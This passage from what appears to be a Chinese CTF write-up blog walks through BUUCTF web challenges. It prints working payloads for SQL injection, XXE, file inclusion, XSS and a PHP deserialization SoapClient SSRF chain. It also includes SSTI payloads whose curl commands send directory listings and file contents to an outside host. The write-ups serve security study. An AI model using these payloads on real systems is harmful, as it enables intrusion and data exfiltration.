?&gt;&quot;params = &#123;&quot;file&quot;:&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;&#125;files = &#123;&#39;file&#39;: BytesIO(payload.encode())&#125;res1 = rq.post(url + &#39;flflflflag.php&#39;, params=params, files=files)# find tmpfileres2 = rq.get(url + &#39;dir.php&#39;)tmpfile = re.findall(r&#39;&quot;(php[\S]&#123;6&#125;)&quot;&#39;, res2.text)[0]tmpfile = &#39;/tmp/&#39; + tmpfile# get flagparams = &#123;&quot;file&quot;:tmpfile&#125;res3 = rq.get(url + &#39;flflflflag.php&#39;, params=params)flag = re.findall(r&#39;(flag&#123;.+?&#125;)&#39;, res3.text)[0]print(flag)</code></pre><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p><strong>娱乐题</strong></p><p>一只右键源码和查看 js 文件可以发现最后的 /fight/ 接口下有如下 js</p><pre><code>// Run to scramble original flag//console.log(scramble(flag, action));function scramble(flag, key) &#123;  for (var i = 0; i &lt; key.length; i++) &#123;    let n = key.charCodeAt(i) % flag.length;    let temp = flag[i];    flag[i] = flag[n];    flag[n] = temp;  &#125;  return flag;&#125;function check_action() &#123;  var action = document.getElementById(&quot;action&quot;).value;  var flag = [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;];  // TODO: unscramble function&#125;</code></pre><p>源码叫我们爆破，那我们当然要自己拼啦</p><pre><code>pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</code></pre><h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p><strong>sql 注入</strong></p><p>查看 js 源码找到接口 <code>/query?search=&quot; + query</code></p><p>再看看 html 源码盲猜后台是 <code>select xx from $_GET[&#39;query&#39;]</code></p><p>注入 <code>?search=arabia_terra union select 1,2#</code> 即有回显</p><blockquote><p>不想手工的可以直接 sqlmap</p><p># sqlmap -u “<a href="http://xxxxx.node3.buuoj.cn/query?search=arabia_terra">http://xxxxx.node3.buuoj.cn/query?search=arabia_terra%20</a>“</p></blockquote><p>最终 payload 如下</p><pre><code>/query?search=amazonis_planitia UNION SELECT id, code FROM alien_code.code</code></pre><h2 id="b01lers2020-Space-Noodles"><a href="#b01lers2020-Space-Noodles" class="headerlink" title="[b01lers2020]Space Noodles"></a>[b01lers2020]Space Noodles</h2><p><strong>脑洞题</strong></p><blockquote><p>开头先列一下 HTTP 的请求方法，下面会用到</p></blockquote><table><thead><tr><th align="left">序号</th><th align="left">方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">GET</td><td align="left">请求指定的页面信息，并返回实体主体。</td></tr><tr><td align="left">2</td><td align="left">HEAD</td><td align="left">类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头</td></tr><tr><td align="left">3</td><td align="left">POST</td><td align="left">向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和/或已有资源的修改。</td></tr><tr><td align="left">4</td><td align="left">PUT</td><td align="left">从客户端向服务器传送的数据取代指定的文档的内容。</td></tr><tr><td align="left">5</td><td align="left">DELETE</td><td align="left">请求服务器删除指定的页面。</td></tr><tr><td align="left">6</td><td align="left">CONNECT</td><td align="left">HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。</td></tr><tr><td align="left">7</td><td align="left">OPTIONS</td><td align="left">允许客户端查看服务器的性能。</td></tr><tr><td align="left">8</td><td align="left">TRACE</td><td align="left">回显服务器收到的请求，主要用于测试或诊断。</td></tr><tr><td align="left">9</td><td align="left">PATCH</td><td align="left">是对 PUT 方法的补充，用来对已知资源进行局部更新 。</td></tr></tbody></table><p>这题有点魔幻，一上来就让我们猜五个接口，看源码就可以看到格式了</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111658.png" alt="image-20200521224548138"></p><p>接口如下</p><ul><li><code>/circle/one/</code>;</li><li><code>/two/</code>;</li><li><code>/square/</code>;</li><li><code>/com/seaerch/</code>;</li><li><code>/vim/quit/</code>.</li></ul><p><strong>接口 /circle/one/</strong></p><p>GET、POST 不行试了一下万能 OPTIONS 有回显，是一个 PDF</p><p>先下载下来，好像没什么用</p><pre><code>curl -X OPTIONS http://95d801c2-a4ba-4d3f-9027-e36053308fa7.node3.buuoj.cn/circle/one/ --output one.pdf</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111653.png" alt="image-20200521225335651"></p><p><strong>接口 /two/</strong></p><p>PUT 请求返回</p><pre><code>Put the dots???</code></pre><p>CONNECT 请求会返回一个 .png 文件，我们继续下下来</p><pre><code>curl -X CONNECT http://95d801c2-a4ba-4d3f-9027-e36053308fa7.node3.buuoj.cn/two/ --output two.png</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111853.png" alt="image-20200521225932745"></p><p>得到文字</p><pre><code>up_on_noodles</code></pre><p><strong>接口 /square/</strong></p><p>DELETE 请求也有一个 .png 文件，是个文字游戏</p><pre><code>curl -X DELETE http://95d801c2-a4ba-4d3f-9027-e36053308fa7.node3.buuoj.cn/square/ --output three.png</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111900.png" alt="image-20200521230252676"></p><p>游戏答案</p><pre><code>    E    S    I    R    P  E R  C E  A TE P NTASTES L A U D U L E   A R   C A   O A N</code></pre><p>得到文字</p><pre><code>tastes</code></pre><p><strong>接口 /com/seaerch/</strong></p><p>GET 请求会返回</p><pre><code>&lt;htlm&gt;,,,,,,,,,&lt;search&gt; &lt;-- comment for search --!&gt;:  ERROR &lt;/&gt; search=null&lt;/end&gt;&lt;/html&gt;</code></pre><p>要用到 search 参数，但是 ?search=1 没东西，所以我们放到 POST 那里试试看</p><pre><code>Content-Type: application/x-www-form-urlencodedContent-Length: 8search=1</code></pre><p>结果返回</p><pre><code>&lt;htlm&gt;,,,,,,,,,&lt;search&gt; &lt;-- comment for search --!&gt;:  &lt;query&gt; 1 is not a good search, please use this one instead: &#39;flag&#39; &lt;try&gt;&lt;/html&gt;</code></pre><p>那我们就输入 flag，得到了</p><pre><code>&lt;htlm&gt;,,,,,,,,,&lt;search&gt; &lt;-- comment for search --!&gt;:  &lt;query&gt; good search&lt;/query&gt;  results: &lt;p&gt;_good_in_s&lt;/p&gt;:w&lt;/html&gt;</code></pre><p>得到文字</p><pre><code>_good_in_s</code></pre><p><strong>接口 /vim/quit/</strong></p><blockquote><p>BUUCTF 没法复现 TRACE 请求</p></blockquote><p>这里的预期解是发送</p><pre><code>TRACE /vim/quit/?exit=:wq</code></pre><p>就会得到</p><pre><code>   &lt;hteeemel&lt;body&gt;&gt;      &lt;flag&gt; well done wait &lt;/flag&gt;&lt;text&gt; this one/&gt; &lt;flag&gt;pace_too&#125;&lt;/flag&gt;&lt;/&gt;</code></pre><p>得到文字</p><pre><code>pace_too&#125;</code></pre><p>上面 5 个接口拿到的文字拼起来</p><pre><code>pctf&#123;ketchup_on_noodles_tastes_good_in_space_too&#125;</code></pre><h2 id="b01lers2020-Scrambled"><a href="#b01lers2020-Scrambled" class="headerlink" title="[b01lers2020]Scrambled"></a>[b01lers2020]Scrambled</h2><p><strong>脑洞题</strong></p><p>源码没什么东西，只有 Cookie 有点东西</p><p><code>frequency</code> 是访问次数</p><p><code>transmissions</code>只有中间四位不断变化，有斜杠，有大括号，猜测前两位应该是 flag，后两位是 flag 所在的位置</p><p>直接上脚本</p><pre><code>import requests as rqimport re, urllibflag = [&#39;_&#39;] * 42url = &quot;http://7f46b512-f523-4788-8e86-e6c8b3deb002.node3.buuoj.cn/&quot;cookies = &#123;&quot;frequency&quot;:&quot;1&quot;,&quot;transmissions&quot;:&quot;x&quot;&#125;while True:    res = rq.get(url, cookies=cookies)    cookie = res.headers[&quot;Set-Cookie&quot;].split(&#39;;&#39;)[3].split(&#39;=&#39;)[2].replace(&quot;kxkxkxkxsh&quot;,&quot;&quot;)    cookie = urllib.parse.unquote(cookie)    if len(cookie) == 4:        index = int(cookie[-2:])    else:        index = int(cookie[-1])    flag[index] = cookie[0]    flag[index + 1] = cookie[1]    print(&#39;&#39;.join(flag))    if &#39;_&#39; not in flag:        break</code></pre><h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p><strong>文件包含</strong></p><p>随意输入一段代码，我们可以知道它是 Linux 下对 c 语言的编译器</p><p>包含文件时如果文件不存在会报错，尝试</p><pre><code>#include &quot;/etc/passwd&quot;</code></pre><p>会爆出部分文件信息，所以这里是文件包含漏洞，直接包含 /flag 即可</p><pre><code>#include &quot;/flag&quot;</code></pre><h2 id="FireshellCTF2020-URL-TO-PDF"><a href="#FireshellCTF2020-URL-TO-PDF" class="headerlink" title="[FireshellCTF2020]URL TO PDF"></a>[FireshellCTF2020]URL TO PDF</h2><p><strong>xss</strong></p><p>vps 上创建如下 index.html</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;link rel=&quot;attachment&quot; href=&quot;file:///flag&quot;&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>本地下载 pdf</p><pre><code>curl -X POST http://b57370e7-5b4d-4485-a409-ea42090a26c4.node3.buuoj.cn/ -d &quot;url=http://174.1.129.147:9999&quot; --output flag.pdf</code></pre><blockquote><p>安装 pdfdetach</p><p>sudo apt install xpdf</p></blockquote><p>利用 pdfdetach 分离 pdf</p><pre><code>$ pdfdetach -list flag.pdf1 embedded files1: flag$ pdfdetach -save 1 flag.pdf$ cat flagflag&#123;c130bcef-78ec-4305-9c1d-645de0affa42&#125;</code></pre><h2 id="FireshellCTF2020-ScreenShooter"><a href="#FireshellCTF2020-ScreenShooter" class="headerlink" title="[FireshellCTF2020]ScreenShooter"></a>[FireshellCTF2020]ScreenShooter</h2><p><strong>xss</strong></p><p>和 URL TO PDF 很类似</p><p>根据 HTTP 查看客户端信息</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111633.png" alt="image-20200524195743552"></p><p>发现其用的是 PhantomJS，所以这里是用 js 来读 flag</p><p>参考一位日本师傅的 wp</p><p><a href="https://st98.github.io/diary/posts/2020-03-23-fireshell-ctf.html">https://st98.github.io/diary/posts/2020-03-23-fireshell-ctf.html</a></p><blockquote><p>因为 flag 返回的是黑色字符，所以这里要把背景弄成白色才能看到 flag</p></blockquote><pre><code>&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;  &lt;head&gt;    &lt;title&gt;test&lt;/title&gt;    &lt;style&gt;body &#123; background: white; &#125;&lt;/style&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;script&gt;      var xhr = new XMLHttpRequest();      xhr.onload = function () &#123;        document.body.innerText = xhr.responseText;      &#125;;      xhr.open(&#39;GET&#39;, &#39;file:///flag&#39;);      xhr.send();    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="FireshellCTF2020-Cars"><a href="#FireshellCTF2020-Cars" class="headerlink" title="[FireshellCTF2020]Cars"></a>[FireshellCTF2020]Cars</h2><p><strong>XXE</strong></p><p>是一个用 Kotlin 写的 APK，我们先来看看它的接口有哪些，刚好对应了三个 Activity</p><pre><code>// apk/app/src/main/java/com/arconsultoria/cars/rest/Rest.ktinterface Rest &#123;    @GET(&quot;/cars&quot;)    fun getCars(): Call&lt;List&lt;Car&gt;&gt;    @GET(&quot;/car/&#123;id&#125;&quot;)    fun getCar(@Path(&quot;id&quot;) id: Int): Call&lt;Car&gt;    @POST(&quot;/comment&quot;)    fun postComment(@Body comment: Comment): Call&lt;CommentResponse&gt;&#125;</code></pre><p><code>/cars</code> 和 <code>/car</code> 接口只能查询信息，下面我们重点看一下 <code>/comment</code> 接口</p><pre><code>// apk/app/src/main/java/com/arconsultoria/cars/activity/CommentActivity.ktfun send_comment() &#123;    val retrofit = Retrofit.Builder()        .baseUrl(resources.getString(R.string.url_api))        .addConverterFactory(GsonConverterFactory.create())        .build()    val service = retrofit.create(Rest::class.java)    val comment = Comment(edt_name.text.toString(), edt_message.text.toString())    val call = service.postComment(comment)    call.enqueue(object : Callback&lt;CommentResponse&gt; &#123;        override fun onFailure(call: Call&lt;CommentResponse&gt;, t: Throwable) &#123;            Toast.makeText(baseContext, &quot;Error posting comment!&quot;, Toast.LENGTH_LONG).show()        &#125;        override fun onResponse(            call: Call&lt;CommentResponse&gt;,            response: Response&lt;CommentResponse&gt;        ) &#123;            if (response.code() != 200) &#123;                Toast.makeText(baseContext, &quot;Error posting comment!&quot;, Toast.LENGTH_LONG).show()                return            &#125;            Toast.makeText(baseContext, response.body()?.message, Toast.LENGTH_LONG).show()            finish()        &#125;    &#125;)&#125;// apk/app/src/main/java/com/arconsultoria/cars/domain/Comment.ktpackage com.arconsultoria.cars.domaindata class Comment(    var name: String,    var message: String)</code></pre><p>大致逻辑就是接受一个 name 和 message，利用 retrofit 调用 Rest 的接口进行 HTTP 应答，然后再显示一个成功信息</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111627.png" alt="image-20200525205600302"></p><p>可以看到我们的名字得到了回显，所以我们可以猜想一个有没有可能有 xxe，发现可以成功回显</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111624.png" alt="image-20200525210033943"></p><p>然后直接读 /flag 就好</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE foo [  &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; ]&gt; &lt;Comment&gt;    &lt;name&gt;&amp;xxe;&lt;/name&gt;    &lt;message&gt;hello&lt;/message&gt;&lt;/Comment&gt;</code></pre><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p><strong>反序列化</strong></p><p>进去后得到源码，需要我们构造反序列化pop链</p><pre><code>&lt;?php?&gt; </code></pre><p>IP 伪造要一个个试</p><pre><code>Client-Ip: 127.0.0.1</code></pre><p>file_get_content 用 php://input 绕过</p><p>file 写个加密脚本就好</p><pre><code>&lt;?phpfunction encode($re)&#123;    $c = &#39;&#39;;    for($i=0;$i&lt;strlen($re);$i++)&#123;         $c .= chr ( ord ($re[$i]) - $i*2 );     &#125;     $v = base64_encode($c);     return $v;&#125;echo encode(&#39;flag.php&#39;);# ZmpdYSZmXGI=</code></pre><p>最终 payload</p><pre><code>GET /secrettw.php?2333=php://input&amp;file=ZmpdYSZmXGI%3d HTTP/1.1Host: 54df68eb-d79a-4927-ad56-ad94e5470714.node3.buuoj.cnClient-Ip: 127.0.0.1Content-Length: 20todat is a happy day</code></pre><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p><strong>代码审计</strong></p><pre><code>I put something in F12 for youinclude &#39;flag.php&#39;;$flag=&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;    $id=$_GET[&#39;id&#39;];    $gg=$_GET[&#39;gg&#39;];    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;        echo &#39;You got the first step&#39;;        if(isset($_POST[&#39;passwd&#39;])) &#123;            $passwd=$_POST[&#39;passwd&#39;];            if (!is_numeric($passwd))            &#123;                 if($passwd==1234567)                 &#123;                     echo &#39;Good Job!&#39;;                     highlight_file(&#39;flag.php&#39;);                     die(&#39;By Retr_0&#39;);                 &#125;                 else                 &#123;                     echo &quot;can you think twice??&quot;;                 &#125;            &#125;            else&#123;                echo &#39;You can not get it !&#39;;            &#125;        &#125;        else&#123;            die(&#39;only one way to get the flag&#39;);        &#125;&#125;    else &#123;        echo &quot;You are not a real hacker!&quot;;    &#125;&#125;else&#123;    die(&#39;Please input first&#39;);&#125;&#125;Please input first</code></pre><p>数据绕 md5 ，数字加字母绕过 is_numeric</p><pre><code>POST /?gg[]=1&amp;id[]=2 HTTP/1.1Host: 3b3bfe4c-e6a9-4d8e-a886-7b741a51276a.node3.buuoj.cnContent-Length: 15Content-Type: application/x-www-form-urlencodedpasswd=1234567a</code></pre><h2 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="[MRCTF2020]Ezpop_Revenge"></a>[MRCTF2020]Ezpop_Revenge</h2><p><strong>SoapClient ssrf</strong></p><p><a href="http://www.zip">www.zip</a> 源码泄露</p><p>查看 flag.php，需要 ssrf</p><pre><code>&lt;?php    if(!isset($_SESSION)) session_start();    if($_SERVER[&#39;REMOTE_ADDR&#39;]===&quot;127.0.0.1&quot;)&#123;       $_SESSION[&#39;flag&#39;]= &quot;MRCTF&#123;******&#125;&quot;;    &#125;else echo &quot;我扌your problem?\nonly localhost can get flag!&quot;;?&gt;</code></pre><p>查看 Plugin.php，可以看到存在反序列化操作</p><pre><code>    public function action()&#123;        if(!isset($_SESSION)) session_start();        if(isset($_REQUEST[&#39;admin&#39;])) var_dump($_SESSION);        if (isset($_POST[&#39;C0incid3nc3&#39;])) &#123;            if(preg_match(&quot;/file|assert|eval|[`\&#39;~^?&lt;&gt;$%]+/i&quot;,base64_decode($_POST[&#39;C0incid3nc3&#39;])) === 0)                unserialize(base64_decode($_POST[&#39;C0incid3nc3&#39;]));            else &#123;                echo &quot;Not that easy.&quot;;            &#125;        &#125;    &#125;</code></pre><p>激活的方法在 /page_admin</p><pre><code>public static function activate($pluginName)&#123;    self::$_plugins[&#39;activated&#39;][$pluginName] = self::$_tmp;    self::$_tmp = array();    Helper::addRoute(&quot;page_admin_action&quot;,&quot;/page_admin&quot;,&quot;HelloWorld_Plugin&quot;,&#39;action&#39;);&#125;</code></pre><p>我们跟进这个奇怪的 class</p><pre><code>class HelloWorld_DB&#123;    private $flag=&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;;    private $coincidence;    function  __wakeup()&#123;        $db = new Typecho_Db($this-&gt;coincidence[&#39;hello&#39;], $this-&gt;coincidence[&#39;world&#39;]);    &#125;&#125;</code></pre><p>转到 /var/Typecho/Db.php，看到 $adapterName 进行了拼接</p><pre><code>    public function __construct($adapterName, $prefix = &#39;typecho_&#39;)    &#123;        /** 获取适配器名称 */        $this-&gt;_adapterName = $adapterName;        /** 数据库适配器 */        $adapterName = &#39;Typecho_Db_Adapter_&#39; . $adapterName;        if (!call_user_func(array($adapterName, &#39;isAvailable&#39;))) &#123;            throw new Typecho_Db_Exception(&quot;Adapter &#123;$adapterName&#125; is not available&quot;);//__toString()        &#125;        $this-&gt;_prefix = $prefix;        /** 初始化内部变量 */        $this-&gt;_pool = array();        $this-&gt;_connectedPool = array();        $this-&gt;_config = array();        //实例化适配器对象        $this-&gt;_adapter = new $adapterName();    &#125;</code></pre><p>搜索 __string() 方法，跳转到 /var/Tpecho/Db/Query.php</p><pre><code>public function __toString()&#123;    switch ($this-&gt;_sqlPreBuild[&#39;action&#39;]) &#123;        case Typecho_Db::SELECT:            return $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild);        case Typecho_Db::INSERT:            return &#39;INSERT INTO &#39;            . $this-&gt;_sqlPreBuild[&#39;table&#39;]            . &#39;(&#39; . implode(&#39; , &#39;, array_keys($this-&gt;_sqlPreBuild[&#39;rows&#39;])) . &#39;)&#39;            . &#39; VALUES &#39;            . &#39;(&#39; . implode(&#39; , &#39;, array_values($this-&gt;_sqlPreBuild[&#39;rows&#39;])) . &#39;)&#39;            . $this-&gt;_sqlPreBuild[&#39;limit&#39;];        case Typecho_Db::DELETE:            return &#39;DELETE FROM &#39;            . $this-&gt;_sqlPreBuild[&#39;table&#39;]            . $this-&gt;_sqlPreBuild[&#39;where&#39;];        case Typecho_Db::UPDATE:            $columns = array();            if (isset($this-&gt;_sqlPreBuild[&#39;rows&#39;])) &#123;                foreach ($this-&gt;_sqlPreBuild[&#39;rows&#39;] as $key =&gt; $val) &#123;                    $columns[] = &quot;$key = $val&quot;;                &#125;            &#125;            return &#39;UPDATE &#39;            . $this-&gt;_sqlPreBuild[&#39;table&#39;]            . &#39; SET &#39; . implode(&#39; , &#39;, $columns)            . $this-&gt;_sqlPreBuild[&#39;where&#39;];        default:            return NULL;    &#125;&#125;</code></pre><p>看到当 action 为 SELECT 时，会调用 <code>$this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild);</code>，如果 $this-&gt;<code>_adapter</code> 没有 <code>parseSelect</code> 方法，就会触发 <code>__call()</code> 函数，这里就满足了 SoapClient 反序列化的条件</p><p>所以这里的 POP 链就是</p><ol><li>反序列化 <code>HelloWorld_DB</code> 类触发 __wakeup() 方法</li><li>让 <code>Typecho_Db_Query</code> 赋值给  <code>coincidence[&#39;hello&#39;]</code>，让其触发 <code>__toString()</code> 方法</li><li>让 <code>SELECT</code> 赋值给 <code>_sqlPreBuild[&#39;action&#39;]</code>，让其触发 <code>$this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild)</code></li><li>让 <code>SoapCient</code> 类赋值给 <code>$this-&gt;_adapter</code>，让其触发 <code>__call()</code> 方法</li></ol><p>但是这里会有个坑，就是私有变量的 %00 是打不通的，我们可以选择用十六进制 \00 绕过，并且把字符串 s 标识符变成 S，这里参考颖奇师傅的 payload</p><p><a href="https://www.gem-love.com/ctf/2184.html#Ezpop_Revenge">https://www.gem-love.com/ctf/2184.html#Ezpop_Revenge</a></p><p>所以最终 payload 是</p><pre><code>&lt;?phpclass Typecho_Db_Query&#123;    private $_sqlPreBuild;    private $_adapter;    public function __construct() &#123;        $this-&gt;_sqlPreBuild = array(&#39;action&#39; =&gt; &#39;SELECT&#39;);        $url = &quot;http://127.0.0.1/flag.php&quot;;        $headers = array(            &#39;X-Forwarded-For: 127.0.0.1&#39;,            &#39;Cookie: PHPSESSID=2ao5l5vohokfb6kooqkibfhnv1&#39;        );          $this-&gt;_adapter = new SoapClient(null, array(&#39;uri&#39; =&gt; &#39;hello&#39;, &#39;location&#39; =&gt; $url, &#39;user_agent&#39; =&gt;             &#39;kk^^&#39;.join(&#39;^^&#39;, $headers)));    &#125;&#125;class HelloWorld_DB&#123;    private $coincidence;    public function __construct() &#123;        $this-&gt;coincidence = array(&#39;hello&#39; =&gt; new Typecho_Db_Query());    &#125;&#125;function decorate($str)&#123;    $arr = explode(&#39;:&#39;, $str);    $newstr = &#39;&#39;;    for ($i = 0; $i &lt; count($arr); $i++) &#123;        if (preg_match(&#39;/00/&#39;, $arr[$i])) &#123;            $arr[$i-2] = preg_replace(&#39;/s/&#39;, &quot;S&quot;, $arr[$i-2]);        &#125;    &#125;    $i = 0;    for (; $i &lt; count($arr) - 1; $i++) &#123;        $newstr .= $arr[$i];        $newstr .= &quot;:&quot;;    &#125;    $newstr .= $arr[$i];    return $newstr;&#125;$xx = serialize(new HelloWorld_DB());$xx = preg_replace(&quot;/\^\^/&quot;, &quot;\r\n&quot;, $xx);$xx = urlencode($xx);$xx = preg_replace(&#39;/%00/&#39;, &#39;%5c%30%30&#39;, $xx);$xx = decorate(urldecode($xx));var_dump($xx);$xxx = base64_encode($xx);echo $xxx;?&gt;</code></pre><p>带上 PHPSESSID 和 admin 参数就可以看到 flag 了</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111601.png" alt="image-20200523172231392"></p><h2 id="Zer0pts2020-phpNantokaAdmin"><a href="#Zer0pts2020-phpNantokaAdmin" class="headerlink" title="[Zer0pts2020]phpNantokaAdmin"></a>[Zer0pts2020]phpNantokaAdmin</h2><p><strong>Sqlite 注入</strong></p><p>根据提示这是一个 Sqlite 数据库，相应的操作有创建表、插入值和删除表，那么有可能存在注入的是创建表和插入值，但是插入值那里似乎注不了，所以注入点应该在创建表那里</p><p>首先我们需要知道 Sqlite 的一些特性</p><p>当 Sqlite 进行 select 时，可以用<code>[]</code>、<code>&#39;</code>、<code>&quot;</code> 和 ` 来装饰列名，位于列名后面的字段被称为别名，如</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111558.png" alt="image-20200523180454324"></p><p>create table 时支持一种 as 的语法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111555.png" alt="image-20200523180711650"></p><p>参数处有 32 长度的字符限制，所以我们不能进行常规的查表查字段，不过我们直接直接查询当前表的 sql 语句，还有过滤了一些标点符号，其中过滤了注释符 <code>--</code> ，可以用 <code>;</code> 进行闭合</p><p>查询当前表的数据操作</p><pre><code>table_name=kk as select [sql][&amp;columns[0][name]=1&amp;columns[0][type]=]from sqlite_master;</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111551.png" alt="image-20200523182143870"></p><p>直接查值就好</p><pre><code>table_name=kk as select [flag_2a2d04c3][&amp;columns[0][name]=1&amp;columns[0][type]=1]from flag_bf1811da;</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111548.png" alt="image-20200523182310654">``</p><h2 id="Zer0pts2020-musicblog"><a href="#Zer0pts2020-musicblog" class="headerlink" title="[Zer0pts2020]musicblog"></a>[Zer0pts2020]musicblog</h2><p><strong>xss</strong></p><p>首先搜一下 flag 在哪里</p><p>可以看到 admin 会对我们的文章进行点赞，所以我们可以尝试在文章中嵌入 <code>#like</code> 标签</p><pre><code># /worker/worker.jsconst crawl = async (url) =&gt; &#123;    console.log(`[+] Query! ($&#123;url&#125;)`);    const page = await browser.newPage();    try &#123;        await page.setUserAgent(flag);        await page.goto(url, &#123;            waitUntil: &#39;networkidle0&#39;,            timeout: 10 * 1000,        &#125;);        await page.click(&#39;#like&#39;);    &#125; catch (err)&#123;        console.log(err);    &#125;    await page.close();    console.log(`[+] Done! ($&#123;url&#125;)`)&#125;;</code></pre><p>在文章渲染的地方它用到了 <code>render_tags</code></p><pre><code># web/www/post.php&lt;div class=&quot;mt-3&quot;&gt;    &lt;?= render_tags($post[&#39;content&#39;]) ?&gt;&lt;/div&gt;</code></pre><p>跟进一下这个函数做了什么，就是只留下 <code>&lt;audio&gt;</code> 标签</p><pre><code># web/www/util.phpfunction render_tags($str) &#123;  $str = preg_replace(&#39;/\[\[(.+?)\]\]/&#39;, &#39;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#39;, $str);  $str = strip_tags($str, &#39;&lt;audio&gt;&#39;); // only allows `&lt;audio&gt;`  return $str;&#125;</code></pre><p>但是 <code>strip_tags</code> 这个函数是存在漏洞的，参考 </p><p><a href="https://blog.spoock.com/2018/03/19/wrong-usage-of-filter-function/">https://blog.spoock.com/2018/03/19/wrong-usage-of-filter-function/</a></p><p>所以我们可以利用漏洞构造一个 <code>&lt;a&gt;</code> 标签</p><pre><code>&lt;a/udio id=like href=http://http.requestbin.buuoj.cn/1c7z4dg1&gt;xss&lt;/audio&gt;</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111543.png" alt="image-20200525110253009"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-1</title>
      <link href="/2020/05/26/BUUCTF-1/"/>
      <url>/2020/05/26/BUUCTF-1/</url>
      
        <content type="html"><![CDATA[<p>补一下之前做的 BUUCTF 的一些练习</p><span id="more"></span><h2 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h2><p>SSTI 模板注入，输入以下会报错</p><pre><code>&#123;&#123;2*2&#125;&#125;</code></pre><p>我们可以用以下绕过</p><pre><code>&#123;% if xxx %&#125; 1 &#123;% endif %&#125;</code></pre><p>经过 fuzz 之后以下关键词被绕过，原理是直接 replace，可以插入黑名单绕过</p><p>优先 python2，优先命令执行，见到 waf 就插 ifconfig，试出以下 payload</p><p>不知道为什么内网的 requests curl 不了，所以就开了台内网的机子</p><pre><code>&#123;% iconfigf ().__claconfigss__.__basconfiges__[0].__subclconfigasses__()[59].__init__.func_globaconfigls.linecache.oconfigs.popconfigen("curl http://174.0.234.231:9000/`ls /|base64`").read()%&#125;kk&#123;% endiconfigf %&#125;</code></pre><pre><code>&#123;% iconfigf ().__claconfigss__.__basconfiges__[0].__subclconfigasses__()[59].__init__.func_globaconfigls.linecache.oconfigs.popconfigen("curl http://174.0.234.231:9000/ -d `cat /*|base64`").read()%&#125;kk&#123;% endiconfigf %&#125;</code></pre><h2 id="HITCON-2019-Buggy-Net"><a href="#HITCON-2019-Buggy-Net" class="headerlink" title="[HITCON 2019]Buggy_Net"></a>[HITCON 2019]Buggy_Net</h2><p>此题考察了 ASP.NET 4.0 的漏洞</p><p>在 ASP.NET 4.0 中，对于 